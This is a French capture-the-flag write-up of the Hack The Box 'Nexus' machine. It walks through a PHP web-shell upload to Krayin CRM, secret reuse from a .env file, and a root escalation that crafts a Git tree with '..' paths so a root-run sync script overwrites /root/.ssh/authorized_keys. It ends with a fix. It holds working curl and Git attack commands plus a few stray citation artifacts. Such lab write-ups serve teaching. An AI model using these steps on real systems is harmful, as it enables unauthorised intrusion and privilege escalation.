# Hack The Box — Nexus — Write-up

## 1. Résumé

Chaîne d'exploitation observée :

`Krayin CRM → upload PHP → RCE www-data → .env → jones → Gitea → template repository → systemd timer/service root → Git path traversal → /root/.ssh/authorized_keys → root`

La machine combine une vulnérabilité web initiale et une mauvaise conception d'un synchronisateur de templates exécuté en root.

---

## 2. Accès initial : Krayin

L'application était accessible via `http://billing.nexus.htb`.

Après authentification administrateur, le token CSRF pouvait être récupéré :

```bash
TOKEN=$(curl -s -b jar.txt http://billing.nexus.htb/admin/dashboard   | grep -oP 'name="_token" value="\K[^"]+' | head -1)
```

L'endpoint TinyMCE d'upload acceptait un fichier PHP :

```bash
curl -i -b jar.txt   -H 'X-Requested-With: XMLHttpRequest'   -F "_token=$TOKEN"   -F 'file=@shell.php'   http://billing.nexus.htb/admin/tinymce/upload
```

Le serveur retournait une URL sous `/storage/tinymce/`.

La requête vers le fichier PHP confirmait l'exécution :

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

On obtient donc une RCE sous `www-data`.

---

## 3. Reconnaissance et `.env`

Le contexte d'exécution était :

```text
www-data
/var/www/krayin/storage/app/public/tinymce
```

Le fichier `/var/www/krayin/.env` était lisible et contenait notamment :

```text
APP_DEBUG=true
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=<secret>
```

Le secret découvert a permis de poursuivre vers le compte `jones` dans le contexte de cette machine.

---

## 4. Accès jones

Une fois connecté :

```bash
whoami
id
pwd
```

Résultat :

```text
jones
uid=1000(jones) gid=1000(jones) groups=100(users)
```

Le user flag était :

```bash
cat ~/user.txt
```

Valeur observée :

```text
55a03b7918246c42aa195bed37340ec9
```

---

## 5. Énumération locale

`sudo -l` ne donnait pas de privilèges :

```text
Sorry, user jones may not run sudo on nexus.
```

Les SUID et capabilities n'ont pas fourni d'escalade directe.

La reconnaissance des processus a cependant révélé :

```text
/usr/local/bin/gitea web --config /etc/gitea/app.ini
```

Puis :

```bash
find /etc /var/lib /home -iname '*gitea*' -o -iname 'app.ini' 2>/dev/null
```

a révélé :

```text
/etc/gitea
/etc/gitea/app.ini
/var/lib/gitea
```

---

## 6. Découverte du synchronisateur root

Les fichiers déterminants étaient :

```text
/etc/systemd/system/gitea-template-sync.timer
/etc/systemd/system/gitea-template-sync.service
/etc/gitea/template-sync.py
```

Le timer :

```ini
[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service
```

Le service :

```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

Le point critique est :

```text
User=root
```

Le script est donc exécuté avec les privilèges root chaque fois que le timer se déclenche.

Le log était :

```text
/var/log/template-sync.log
```

---

## 7. Analyse de template-sync.py

Les variables importantes étaient :

```python
GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"
```

Le script recherche les repositories marqués comme templates via l'API Gitea.

Gitea documente officiellement les template repositories et leur fonctionnement. citeturn0search0turn0search1

Le code récupère ensuite les fichiers avec :

```python
git ls-tree -r HEAD
```

Puis construit :

```python
target = os.path.join(stage_path, filepath)
```

et écrit :

```python
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

Il n'y avait pas de contrôle garantissant que `target` restait sous `stage_path`.

Cela donne une primitive de **path traversal → arbitrary file write**, aggravée par le fait que le script tourne en root.

---

## 8. Repository template contrôlé par jones

Le compte `jones` disposait du repository :

```text
jones/rce
```

Il a été marqué comme template.

Au départ, le synchronisateur indiquait :

```text
Found 0 template repo(s)
```

Après activation du template :

```text
Found 1 template repo(s)
Syncing template: jones/rce
```

Gitea supporte nativement les repositories templates. citeturn0search0

---

## 9. Problème HEAD

La première synchronisation échouait :

```text
ls-tree failed: fatal: Not a valid object name HEAD
```

Après avoir correctement poussé le repository, la synchronisation fonctionnait :

```text
synced: .env
synced: docker-compose.yml
synced: documents
```

---

## 10. Construction de l'arbre Git

L'objectif était de faire apparaître un chemin sortant du staging :

```text
../../../../../../root/.ssh/authorized_keys
```

Git refuse normalement un arbre contenant `..` :

```text
error: object fails fsck: hasDotdot: contains '..'
fatal: refusing to create malformed object
```

Dans le lab, l'objet a été créé avec :

```text
git hash-object --literally
```

Un repository temporaire a servi à stocker les objets Git.

Le blob de `authorized_keys` était :

```text
0a43af9de6e10a8f54ad0ff9ddd65748f851949c
```

L'arbre final :

```text
9fca4e32d0fa2de21d985583e1da370f6053d389
```

et :

```bash
git ls-tree -r "$TREE"
```

montrait :

```text
100644 blob 0a43af9de6e10a8f54ad0ff9ddd65748f851949c
../../../../../../root/.ssh/authorized_keys
```

C'était la preuve que le chemin contrôlé était présent dans l'objet Git.

---

## 11. Commit et push

Un commit a été créé directement depuis l'arbre :

```bash
COMMIT=$(printf 'template sync\n' | git commit-tree "$TREE")
```

Commit obtenu :

```text
fdc3a4a9df23840220e1b6d72f40d2b071eafc05
```

Depuis Nexus, `git.nexus.htb` ne se résolvait pas correctement.

Le script lui-même utilisait :

```text
http://localhost:3000
```

Le remote a donc été changé vers :

```text
http://127.0.0.1:3000/jones/rce.git
```

Le push a réussi :

```text
+ 9b817fa...fdc3a4a
fdc3a4a9df23840220e1b6d72f40d2b071eafc05 -> main
```

---

## 12. Écriture de authorized_keys

Le passage suivant du log est la preuve définitive :

```text
[2026-08-18 11:07:09] Template sync starting
[2026-08-18 11:07:09] Found 1 template repo(s)
[2026-08-18 11:07:09] Syncing template: jones/rce
[2026-08-18 11:07:09]   synced: ../../../../../../root/.ssh/authorized_keys
[2026-08-18 11:07:09] Template sync complete
```

Le synchronisateur, exécuté par root, a donc écrit notre clé publique dans :

```text
/root/.ssh/authorized_keys
```

---

## 13. Root

Une paire ED25519 avait été créée :

```bash
ssh-keygen -f /tmp/mykey -N ''
```

Après la synchronisation :

```bash
ssh -i /tmp/mykey root@127.0.0.1
```

a permis d'obtenir :

```text
root@nexus:~#
```

Vérification :

```bash
whoami
id
```

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

Le root flag a ensuite été récupéré :

```bash
cat /root/root.txt
```

La capture finale confirme l'accès root.

---

## 14. Pourquoi l'escalade fonctionne

La vulnérabilité repose sur cinq éléments :

1. `jones` contrôle le contenu d'un repository template.
2. Le script récupère les chemins depuis `git ls-tree`.
3. `filepath` est utilisé pour construire directement la destination.
4. Aucun confinement robuste du chemin n'empêche `..`.
5. Le script est exécuté avec `User=root`.

Chaîne :

```text
jones
  ↓
Gitea template
  ↓
filepath contrôlé
  ↓
path traversal
  ↓
template-sync.py
  ↓
User=root
  ↓
arbitrary file write
  ↓
/root/.ssh/authorized_keys
  ↓
SSH root
```

---

## 15. Correctif

Le chemin devrait être résolu puis contrôlé :

```python
base = os.path.realpath(stage_path)
target = os.path.realpath(os.path.join(stage_path, filepath))

if os.path.commonpath([base, target]) != base:
    raise ValueError("path traversal detected")
```

Il faut aussi tenir compte des liens symboliques et des conditions de course.

Surtout, le synchronisateur ne devrait pas être exécuté en root si ce n'est pas indispensable.

---

## 16. Ce que cette machine enseigne

Nexus est une excellente machine pour travailler :

- exploitation web ;
- PHP/Laravel ;
- upload de fichiers ;
- RCE ;
- secrets `.env` ;
- credential reuse ;
- Linux enumeration ;
- Gitea ;
- Git internals ;
- Git object format ;
- systemd ;
- Python ;
- path traversal ;
- arbitrary file write ;
- SSH ;
- privilege escalation.

Le vrai enseignement est de continuer l'énumération après le premier shell :

```text
www-data → jones → Gitea → template → systemd → root
```

---

## 17. Résumé de la kill chain

| Étape | Technique | Résultat |
|---|---|---|
| 1 | Krayin | accès admin |
| 2 | TinyMCE upload | upload PHP |
| 3 | PHP | RCE `www-data` |
| 4 | `.env` | secret réutilisable |
| 5 | SSH | `jones` |
| 6 | Enumeration | Gitea |
| 7 | Template repository | contrôle de `jones/rce` |
| 8 | systemd timer | synchronisation périodique |
| 9 | Python root | écriture privilégiée |
| 10 | Git traversal | chemin arbitraire |
| 11 | `authorized_keys` | accès root |
| 12 | SSH | root |
| 13 | flags | user + root |
